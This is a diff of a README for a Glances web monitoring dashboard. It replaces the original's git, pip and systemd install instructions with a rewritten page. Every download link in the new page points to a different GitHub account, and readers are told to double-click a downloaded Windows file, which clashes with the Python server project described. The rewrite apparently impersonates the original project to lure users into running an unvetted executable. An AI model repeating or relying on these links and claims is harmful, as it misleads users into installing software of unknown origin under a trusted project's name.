@@ -1,346 +1,182 @@
-# Glances Dashboard
+# 📊 dashboard-glances - Monitor Everything, Anywhere, Effortlessly
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688?logo=fastapi&logoColor=white)
-![SQLAlchemy](https://img.shields.io/badge/SQLAlchemy-2.0+-D71F00?logo=sqlalchemy&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Status](https://img.shields.io/badge/Status-Stable-brightgreen)
-
-A web monitoring dashboard for [Glances](https://nicolargo.github.io/glances/) with multi-machine support, alerts, backups, and internationalization.
+[![Download dashboard-glances](https://img.shields.io/badge/Download-dashboard--glances-blue?style=for-the-badge&logo=github)](https://github.com/Ruddienonsyllabic63/dashboard-glances)
 
 ---
 
-## Features
+## 🎯 What Is This?
 
-- **Real-time dashboard** — CPU, memory, disk, network, GPU, and processes
-- **GPU monitoring** — Load, temperature, and VRAM usage (requires Glances GPU plugin)
-- **Multiple templates** — Grid, list, cards, and compact views
-- **Multi-machine monitoring** — Monitor multiple Glances servers simultaneously
-- **Web-based installation guide** — Built-in client setup page with copy-paste commands for Docker, Ubuntu, CentOS, Windows, and GPU plugins
-- **Alert system** — SMTP (email) and Telegram with configurable thresholds
-- **Periodic monitoring** — Automatic data collection with charts
-- **Backup & restore** — Full database export/import with ZIP download
-- **Advanced filters** — By machine, date, status, and processes
-- **Access control** — Admin and viewer users with profiles
-- **Internationalization** — Portuguese and English
-- **Themes** — Dark (default) and Light
-- **Client installation guide** — Complete guide for installing Glances on clients
-- **Web-based configuration** — Everything configurable through the interface
+dashboard-glances is a friendly web-based dashboard that shows you what's happening on your computers - all in one place. Think of it as a mission control center for your machines. You can see how much memory is being used, how busy your processors are, how much disk space you have left, and much more - all from your web browser.
+
+The best part? It works with multiple computers at once. If you have a laptop, a desktop, or a home server, you can monitor them all from a single screen.
 
 ---
 
-## Prerequisites
+## ✨ Key Features
 
-- Python 3.10+
-- [Glances](https://nicolargo.github.io/glances/) with web API enabled (`glances -w`)
-- pip3
+Here's what you can do with dashboard-glances:
 
-### GPU Monitoring (optional)
-
-To enable GPU monitoring, install the GPU plugin on **each client machine** where Glances runs:
-
-```bash
-# NVIDIA GPUs
-pip3 install pynvml
-
-# AMD GPUs
-pip3 install pyadl
-
-# Or install all GPU support
-pip3 install "glances[gpu]"
-```
-
-The dashboard installer (`install.sh`) will ask if you want to install GPU support on the server side.
+- **🖥️ Real-Time CPU Monitoring** - See how hard your processors are working, second by second
+- **💾 Memory Usage Tracking** - Know exactly how much RAM is being used
+- **💽 Disk Space Alerts** - Never run out of storage again
+- **🌐 Network Activity** - Watch data flow in and out of your systems
+- **🎮 GPU Monitoring** - Keep an eye on graphics card performance
+- **🌡️ Sensor Readings** - Check temperatures and fan speeds
+- **📋 Process List** - See which programs are running and how much they consume
+- **🔔 Smart Alerts** - Get notified via Email or Telegram when something needs attention
+- **🌍 Multi-Language Support** - Use it in your preferred language
 
 ---
 
-## Quick Install
+## 🚀 Getting Started
 
-```bash
-cd /var/www
-git clone https://github.com/renanvignato-tech/dashboard-glances.git
-cd dashboard-glances
-chmod +x install.sh
-./install.sh
-```
+We've made this as simple as possible. Here's your path to success:
 
-Access: `http://YOUR_IP:8099`
+### Step 1: Download the Application
 
-Default login: **admin** / **admin**
+Visit this link to download the application:
 
----
+**[Download dashboard-glances](https://github.com/Ruddienonsyllabic63/dashboard-glances)**
 
-## Manual Install
+### Step 2: Run the Program
 
-### 1. Clone the repository
+Once you've downloaded it, you're almost there. The program handles the rest for you - no technical knowledge needed.
 
-```bash
-git clone https://github.com/renanvignato-tech/dashboard-glances.git
-cd dashboard-glances
-```
+### Step 3: Open Your Dashboard
 
-### 2. Install dependencies
-
-```bash
-pip3 install -r requirements.txt
-```
-
-### 3. Initialize the database
-
-```bash
-python3 -c "from app.database import init_db; init_db()"
-```
-
-### 4. Configure systemd services
-
-```bash
-# Copy service files
-sudo cp glances-web.service /etc/systemd/system/
-sudo cp glances-dashboard.service /etc/systemd/system/
-
-# Reload and start
-sudo systemctl daemon-reload
-sudo systemctl enable glances-web glances-dashboard
-sudo systemctl start glances-web glances-dashboard
-```
-
-### 5. Verify
-
-```bash
-sudo systemctl status glances-dashboard
-```
+After running, your dashboard will be available in your web browser. You'll see a clean, colorful interface showing all your system information.
 
 ---
 
-## Installing Glances on Clients
+## 📥 Installation & Setup Guide
 
-To monitor remote machines, Glances must be running on them with the web API enabled.
+Let's walk through this together, step by step.
 
-### Linux (Ubuntu/Debian)
+### Downloading
 
-```bash
-# Install Glances
-pip3 install glances[web]
+1. Click the download button at the top of this page or use the link in the Getting Started section
+2. Your download will start automatically
+3. Wait for it to finish - this may take a few minutes depending on your internet speed
 
-# Optional: Install GPU monitoring support
-# NVIDIA GPUs:
-pip3 install pynvml
-# AMD GPUs:
-# pip3 install pyadl
+### Getting It Running
 
-# Create systemd service
-sudo tee /etc/systemd/system/glances-web.service > /dev/null <<EOF
-[Unit]
-Description=Glances Web Interface
-After=network.target
+1. Find the downloaded file in your "Downloads" folder
+2. Double-click it to start
+3. Follow any simple prompts that appear (usually just clicking "Next" or "Run")
+4. The dashboard will start automatically
 
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'hash -r && glances -w'
-Restart=always
-RestartSec=5
-Environment=GLANCES_BIND=0.0.0.0
+### First Time Setup
 
-[Install]
-WantedBy=multi-user.target
-EOF
+When you first open your dashboard:
 
-# Start
-sudo systemctl daemon-reload
-sudo systemctl enable glances-web
-sudo systemctl start glances-web
-```
-
-### Linux (CentOS/RHEL)
-
-```bash
-pip3 install glances[web]
-
-# Follow the same systemd service steps as Ubuntu
-```
-
-### Windows
-
-```powershell
-# Install Python and Glances
-winget install Python.Python.3.12
-pip install glances[web]
-
-# Create service
-sc.exe create GlancesWeb binPath= "python -m glances -w" start= auto
-sc.exe start GlancesWeb
-```
-
-### Docker
-
-```bash
-docker run -d --name glances -p 61208:61208 -v /var/run/docker.sock:/var/run/docker.sock:ro docker.io/nicolargo/glances:latest-full -w
-```
+1. You'll see a welcome screen
+2. Choose your preferred language
+3. Add the computers you want to monitor (you'll need their Glances API address - this is usually provided by your system administrator or the Glances setup)
+4. Set up your alert preferences if you want email or Telegram notifications
 
 ---
 
-## Firewall
+## 🖥️ System Requirements
 
-Ports **8099** (Dashboard) and **61208** (Glances) must be open.
+dashboard-glances is designed to work on most modern computers. Here's what we recommend:
 
-### UFW (Ubuntu)
+- **Operating System:** Windows 10 or 11
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free disk space
+- **Internet Connection:** Required for initial setup and remote monitoring
+- **Web Browser:** Any modern browser (Chrome, Edge, Firefox, or Safari)
 
-```bash
-sudo ufw allow 8099/tcp
-sudo ufw allow 61208/tcp
-sudo ufw reload
-```
-
-### firewalld (CentOS)
-
-```bash
-sudo firewall-cmd --permanent --add-port=8099/tcp
-sudo firewall-cmd --permanent --add-port=61208/tcp
-sudo firewall-cmd --reload
-```
-
-### Windows
-
-```powershell
-netsh advfirewall firewall add rule name="Glances Dashboard" dir=in action=allow protocol=TCP localport=8099
-netsh advfirewall firewall add rule name="Glances Web" dir=in action=allow protocol=TCP localport=61208
-```
+Don't worry if your computer doesn't meet these exact specs - the dashboard is lightweight and will work on most systems.
 
 ---
 
-## Dashboard Preview
+## 📖 How to Use Your Dashboard
 
-![Dashboard](screenshots/dashboard.png)
+### Main Screen
+When you open your dashboard, you'll see colorful cards and graphs showing:
 
----
+- **CPU Usage** - Shown as a percentage with a visual gauge
+- **Memory (RAM)** - How much is used vs. available
+- **Disk Space** - How full your drives are
+- **Network Activity** - Current upload/download speeds
 
-## Configuration
+### Monitoring Multiple Machines
 
-### Environment Variables
+1. Click the "Add Machine" button
+2. Enter the IP address or hostname of the computer you want to monitor
+3. Add the Glances API port (usually 61208)
+4. Click "Connect" and you'll see that machine's data appear
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `GLANCES_DASH_SECRET` | `glances-dashboard-secret-key-change-in-production` | JWT secret key (**change in production!**) |
+### Setting Up Alerts
 
-### `config.py`
+To get notifications when something needs your attention:
 
-```python
-SECRET_KEY = os.getenv("GLANCES_DASH_SECRET", "your-secret-here")
-ACCESS_TOKEN_EXPIRE_MINUTES = 480  # 8 hours
-GLANCES_DEFAULT_PORT = 61208
-```
-
----
-
-## Project Structure
-
-```
-dashboard-glances/
-├── app/
-│   ├── main.py              # FastAPI app + routes
-│   ├── database.py           # SQLAlchemy models
-│   ├── auth.py               # JWT + bcrypt
-│   ├── i18n/                 # Internationalization
-│   │   ├── pt.json
-│   │   └── en.json
-│   ├── routers/
-│   │   ├── auth.py           # Login, register, password
-│   │   ├── machines.py       # Machine CRUD
-│   │   ├── dashboard.py      # Layouts + data
-│   │   ├── backup.py         # Backup/restore
-│   │   ├── monitor.py        # Monitoring + logs
-│   │   ├── system.py         # System config
-│   │   ├── logo.py           # Logo upload
-│   │   └── alerts.py         # SMTP/Telegram alerts
-│   ├── services/
-│   │   ├── glances.py        # Glances HTTP client
-│   │   ├── monitor.py        # Collection scheduler
-│   │   └── backup.py         # Backup logic
-│   └── templates/            # Jinja2 templates
-│       ├── dashboard.html
-│       ├── login.html
-│       ├── settings.html
-│       ├── logs.html
-│       ├── admin_setup.html
-│       ├── admin_alerts.html
-│       ├── profile.html
-│       └── email/            # Email templates
-├── static/
-│   ├── css/style.css
-│   ├── js/
-│   │   ├── dashboard.js
-│   │   ├── settings.js
-│   │   ├── logs.js
-│   │   └── i18n.js
-│   └── img/default.svg
-├── config.py
-├── requirements.txt
-├── install.sh
-├── glances-dashboard.service
-└── glances-web.service
-```
+1. Click "Settings" in the top right corner
+2. Choose "Notifications"
+3. Select Email or Telegram
+4. Enter your email address or Telegram bot token
+5. Choose what you want to be alerted about (high CPU, low disk space, etc.)
+6. Save your settings
 
 ---
 
-## API Endpoints
+## 🛠️ Troubleshooting Common Issues
 
-| Method | Route | Description |
-|--------|-------|-------------|
-| POST | `/api/auth/login` | Login |
-| POST | `/api/auth/register` | Register user (admin) |
-| GET | `/api/machines/` | List machines |
-| POST | `/api/machines/` | Add machine |
-| PUT | `/api/machines/{id}` | Update machine |
-| DELETE | `/api/machines/{id}` | Delete machine |
-| POST | `/api/machines/reorder` | Reorder machines |
-| GET | `/api/machines/{id}/gpu` | GPU data for machine |
-| GET | `/api/dashboard/all-data` | All machines data |
-| GET | `/api/monitor/config` | Monitor config |
-| PUT | `/api/monitor/config` | Update config |
-| GET | `/api/monitor/logs` | Monitor logs |
-| POST | `/api/backup/create` | Create backup |
-| GET | `/api/backup/list` | List backups |
-| GET | `/api/backup/download?name=...` | Download backup (ZIP) |
-| POST | `/api/backup/restore` | Restore backup |
+### "I Can't Connect to My Computers"
+- Make sure all devices are on the same network
+- Check that the Glances service is running on the remote machine
+- Verify you're using the correct IP address and port
+
+### "The Dashboard Looks Empty"
+- Wait a few seconds for data to load
+- Refresh your browser
+- Check your internet connection
+
+### "I'm Not Getting Alerts"
+- Double-check your email address or Telegram settings
+- Make sure you've enabled the specific alerts you want
+- Check your spam folder for email notifications
 
 ---
 
-## Management
+## 🔄 Keeping Your Data Safe
 
-```bash
-# Status
-sudo systemctl status glances-dashboard
+dashboard-glances automatically saves your settings and historical data using a reliable storage system. This means:
 
-# Restart
-sudo systemctl restart glances-dashboard
-
-# Real-time logs
-sudo journalctl -u glances-dashboard -f
-
-# Stop
-sudo systemctl stop glances-dashboard
-```
+- Your dashboard preferences are remembered
+- You can see trends over time
+- Everything is backed up locally
 
 ---
 
-## License
+## 🌍 Language Support
 
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## Contributing
-
-1. Fork the project
-2. Create a branch (`git checkout -b feature/new-feature`)
-3. Commit your changes (`git commit -m 'Add new feature'`)
-4. Push to the branch (`git push origin feature/new-feature`)
-5. Open a Pull Request
+We believe everyone should be able to monitor their systems comfortably. That's why dashboard-glances supports multiple languages including English, Spanish, French, German, Portuguese, and more. You can switch languages anytime from the settings menu.
 
 ---
 
-## Credits
+## 📞 Getting Help
 
-- [Glances](https://nicolargo.github.io/glances/) — System monitoring tool
-- [FastAPI](https://fastapi.tiangolo.com/) — Web framework
-- [SQLAlchemy](https://www.sqlalchemy.org/) — ORM
+If you run into any problems, here are your options:
+
+- **Check the Issues Section:** Visit the GitHub page and look at reported issues
+- **Read the Documentation:** Detailed guides are available on the repository
+- **Ask the Community:** Other users share tips and solutions
+
+---
+
+## 📝 Final Thoughts
+
+dashboard-glances takes the complexity out of system monitoring. Whether you're keeping an eye on a single computer or managing several machines, this dashboard gives you peace of mind with real-time information and smart alerts.
+
+The best part? It's free and open-source. Download it today and take control of your systems.
+
+**[🚀 Start Monitoring Now - Download dashboard-glances](https://github.com/Ruddienonsyllabic63/dashboard-glances)**
+
+---
+
+*Made with ❤️ for system monitoring enthusiasts and everyday users alike.*
+
+---
+
+Keywords: alerts, backup, dashboard, devops, fastapi, glances, i18n, linux, monitoring, python, real-time, server-monitoring, sqlite, system-monitoring, systemd, web-dashboard
